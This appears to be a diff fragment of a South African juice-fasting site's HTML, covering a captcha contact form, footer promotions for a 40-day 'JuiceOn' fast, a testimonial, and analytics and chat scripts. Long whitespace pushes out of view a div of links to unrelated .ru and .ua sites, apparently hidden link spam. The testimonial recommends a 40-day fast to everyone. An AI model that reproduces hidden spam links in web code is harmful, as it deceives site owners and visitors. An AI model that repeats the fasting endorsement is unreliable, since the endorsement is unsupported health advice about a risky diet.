/8lbdIAiOgKNupU6cC8uJDuqXbF08++aTgaWdnJ4Twvffe462HkJ8SMBGREGDuRdkVwYkTJ4p3FVrRuEYzeEov3N7eThWhqhAE0hBqa2shhIsXL75+/TqZXlFRQU0lhQnHcZgnH/h+GP/88w8z3eJNAtq2AZ4SFIugYNJLCeHZhbNmzaJSKCGWDO5fuHBh7ty55ORpZ2cnU4UMGzZMm1slncRc6dnR0SHekzphwgRv4quvvmrrPDSL0oxbg2wW13V9Dx6RRCAjMqWl5Q+bYy7Rk4R3cdd3332nQaSoqEhp1EbfEnOJ+IYNG86dO4cnG8glbbzXtHi4ZTKZfPTRR30DRr4gFSpq4dOnT9u9c0+kC23N+SjdcZCXrcQYsVgMiaBqfJG5Px8AcPr0aQjh+++/j/5evXpVsHahX79+SpX6wlwEAQDl5eW4NVAk0vq1j1xdmMfVDBoa0Ss0gvkYeTbEGdrb2x955BEyP4/tnTt3IoFg7lnGwAFOW0gmk77jsur++SBg5+4nyWzyytV1XcNVeu+88w6VkslkSLPGPOjgjZiY9FkQ/T19+nT5er3zgbzjxK3D1C6UFyyecuVt2f/iiy8AAPv379fYH+ntUe/aQd6RX177sqamBgUax48ff+7cOZw+ePBgZtXV1dXHjx+X57Zfv37WtSAPzC1dvA8gtPHwvhRqH4+surBRqZbZs2fjGKHJOWBr165dunQpFq/Ro0czF0u7ruvdfJjL5STv33McJxaLod3BvDNDSIwbNw59bDwMGzaMOhQGAHDo0CEZZhACGlJ9pUVenBzHuX/fSQh3tvhe0cO7HoyHFStWbNu27dKlSzKZmTTDuX1p+/btr7zyyhtvvFFfXy/JbUFDqVXj8fh9KYzULU7xeFz+xq+ArsXqgRhKcoYyJxIJ3K3k70jfdyIJi8ftB3drAxqsQ7hZNzRItpXvFUYPjMg96Hrw2vOAKIdcNgg6XZ4xhFRsGqS6uRRGbbTV662ovUWXbUsmilIYnctaI9j93RJBrWZQvfGCBA52MMkqTdIbGnkCTuShd6SfKpQmBSKHgKQ7Ho+nUinJnAHxII/weQjCN49CS+pBwUcOyH/M+0WpPTfa5R9iIU2lUta9RQqF+AXr8RydN40OJwhR9E7ESCQS+W1Ek5BEOJyLK9JjI1DOC08K/yMwicCZwzuRRv61LpHRkkKNWcSoDS7dBoJvwHqbR2s/ssYONIFXQUYuVEM8qrAeJQkn8iJoE4G/aN+TE8i7ZKilB10BqIc8DsehATcaQxeiTxAdFi0Q3wKNkcqvDOc9YuoP6+ohj6Gr0IAbjTsiZ7PZbhlCk3wpcoMPJZG5XC6EuRBtFKJ2uB+1rqury2QyvmZWtxRNMeTD9XmPwBcqmOO070AeWVDmVHAMR78pTGAS2tQoGK1IjV30eFcmCPMz+z+xdp338oaKrwAAAABJRU5ErkJggg==" alt="CAPTCHA" /></div>
+									<input type="text" id="jsn-captcha" name="captcha" autocomplete="off" placeholder="Captcha">
+									</div>
+									</div></div><div class="form-actions">
+									<div class="btn-toolbar">
+									    <button class="btn btn-success prev hide" onclick="return false;">PREV</button>
+									    <button class="btn btn-success next hide" onclick="return false;">NEXT</button>
+									    <button class="btn btn-success reset" onclick="return false;" style="display:none">Reset</button>
+									    <button type="submit" class="btn btn-success jsn-form-submit hide" >Get Started</button>
+									</div>
+								     </div><input type="hidden" name="form_name" value="095ce5377c9c950763deed0aba9b3f03" /></div><input type="hidden" name="task" value="form.save" /><input type="hidden" name="option" value="com_uniform" /><input type="hidden" name="form_id" value="1" /><input type="hidden" id="form_post_action" name="form_post_action" value="3" /><input type="hidden" name="form_post_action_data" value='43' /><input type="hidden" name="55d8e96607659a6129b1fd24c9016e38" value="1" /></form></div></div></td>
+</tr>
+</tbody>
+</table> 
+	
+								                                                                                                                                                                                                                                                          <div id="vtem-nt"><a href="http://allstyling.ru/" target="_blank" title="All Styling">All Styling</a><br><a href="http://absolut.vn.ua/" target="_blank" title="Absolut">Absolut</a></div> </div>
+</div><br> </div>
+                        </div><div id="vt_nav_right" class="vt_auto_cols none floatright">&nbsp;</div>   
+                        </div>           
+            </div> 
+                       </div>   
+            
+                    
+      </div>
+      <!-- /////////////////// FOOTER LAYOUT ///////////////////////////-->   
+  <div id="vt_footer_section" class="vt_footer_section clearfix"> 
+        <div id="vt_wapper_footer"> 
+                            <div id="vt_footer" class="vt_footer clearfix">
+                 <div class="vt_section clearfix">
+                        <div class="vt_width25  floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Proven Results</span></span></h3>
+					
+
+<div class="custom"  >
+	<p><span style="font-family: verdana, geneva; font-size: 10pt; line-height: 1.3em; color: #549c2f;">Join our 40 Day JuiceOn program now for only <strong>R2600</strong> (Includes our Essential Fasting Pack valued at over R1600)</span></p>
+<p><span class="best" style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;">Purchase any <strong><a href="http://www.fortydays.co.za/product-category/health-appliances/" target="_blank"><span style="color: #549c2f;">Juicer from us</span></a></strong>, and Save<strong> R220</strong> on your <a href="http://www.fortydays.co.za/shop/juiceon/juiceon-program/" target="_blank"><strong><span style="color: #549c2f;">JuiceOn Program</span></strong></a>! Order NOW!</span></p></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Support</span></span></h3>
+					
+
+<div class="custom"  >
+	<p style="text-align: left;"><span style="color: #549c2f;"><strong><span style="font-family: verdana, geneva; font-size: 10pt;"><a href="http://www.juiceon.co.za/your-health-coach"><span style="color: #549c2f;">Your health coach</span></a> </span></strong></span><br /><span class="best" style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;"> Personal Health Coach consultations can be purchased separately, complete the contact form with "Consultations" in the message subject and we will reply with more information. </span></p></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Testimonials</span></span></h3>
+					
+
+<div class="custom"  >
+	<div class="testcopy" style="text-align: left;"><span style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;">In July 2010, I did a 40 day fast . I will be redoing the fast annually for as long as I live. My body has been in balance since then, I have become a vegetarian have started exercising and generally enjoying a better quality of life. The strangest thing is that the fast was not nearly as difficult as I thought it would be. I would gladly share my experiences with anyone interested in doing the fast, and would recommend it to everyone</span></div>
+<div class="testcopy" style="text-align: left;"><br /><span class="testname" style="font-family: verdana, geneva; font-size: 6pt; color: #549c2f;">George Sinovich - 2010 The Codfather Village Of Restaurants</span></div></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable_menu">
+        <div class="vt_box">
+					<ul class="menu nav-pills">
+<li id="item-659"><a href="/" ><span>Home</span></a></li><li id="item-435"><a href="/disclaimer" > <span> Disclaimer</span></a></li><li id="item-551"><a href="/site-map" > <span> Site Map</span></a></li><li id="item-567"><a href="/links?id=0" > <span> Links</span></a></li><li id="item-610"><a href="/partners" > <span> Partners</span></a></li></ul>         </div>   
+		</div>
+	</div></div>                 </div>
+                </div> 
+                      
+           <div class="wapper_copyright_gotop clearfix">
+                           <div class="vt_section clearfix">
+                 <div id="vt_copyright" class="vt_copyright clearfix">
+                        <div class="vt_width100  floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<div class="footer1">Copyright &#169; 2018 JuiceOn. All Rights Reserved.</div>
+<BR><BR>
+         </div>   
+		</div>
+	</div></div>                 </div>
+              <div id="gotop"><p><a href="#vtem" title="Back to Top"><span>Go Top</span></a></p></div>                 </div> 
+                      <div class="clr"></div>
+             
+           </div>
+       </div>  
+     </div>     
+  </div>    
+  </div>     
+</div>  
+<script type="text/javascript" src="/templates/vt_weightloss/vtemtools/menus/fg.menu.js"></script>
+<script type="text/javascript">
+var vtemdrilldownm = jQuery.noConflict();jQuery(document).ready(function(){jQuery("#vtflatmenu").menu({content: jQuery("#vtflatmenu").next().html(),crumbDefaultText: ""});});
+
+////////////////EQUA COLUNMS /////////////////
+var Equalizer = new Class({
+initialize: function(elements) {
+this.elements = $$(elements);
+},
+equalize: function(hw) {
+if(!hw) { hw = 'height'; }
+var max = 0,
+prop = (typeof document.body.style.maxHeight != 'undefined' ? 'min-' : '') + hw; //ie6 ftl
+offset = 'offset' + hw.capitalize();
+this.elements.each(function(element,i) {
+var calc = element[offset];
+if(calc > max) { max = calc; }
+},this);
+this.elements.each(function(element,i) {
+element.setStyle(prop,max - (element[offset] - element.getStyle(hw).toInt()));
+});
+return max;
+}
+});
+///////////////////////////////////////////////////////////////
+/*
+function fixHeight1 () {
+var equalizer1 = new Equalizer("#vt_main_inside .vt_auto_cols").equalize("height");
+}
+window.addEvent ("load", function () {
+fixHeight1.delay (300);
+}); 
+*/
+</script>
+<script type="text/javascript">
+			var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+			document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+			</script>
+			<script type="text/javascript">
+			try {
+			var pageTracker = _gat._getTracker("UA-46323428-1");
+			pageTracker._trackPageview();
+			} catch(err) {}</script>
+			
+<script type="text/javascript">$zopim(function() { $zopim.livechat.setLanguage('en'); });</script></body>
+</html>
